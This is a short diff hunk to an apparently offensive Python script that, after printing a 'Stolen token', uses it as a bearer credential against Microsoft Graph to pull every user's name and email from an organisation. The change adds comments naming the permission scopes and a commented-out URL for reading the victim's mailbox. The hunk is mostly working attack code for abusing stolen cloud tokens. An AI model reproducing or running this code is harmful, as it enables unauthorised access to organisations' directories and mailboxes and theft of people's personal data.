@@ -23,7 +23,12 @@ def on_modified(event):
             print(f"Stolen token: ", format(token))
             print(f"")
             print(f"Grabbing users personal information (name/email) from the cloud...")
+            # SCOPE ==> User.ReadBasic.All
+            # read basic info of the users in organization
             URL = 'https://graph.microsoft.com/v1.0/users?$select=displayName,mail'
+            # SCOPE ==> Mail.Read
+            # read messages in user mailbox
+            # URL = 'https://graph.microsoft.com/v1.0/me/messages'
             headers = {
                 "Authorization": "Bearer {}".format(token),
                 "Accept": "application/json"
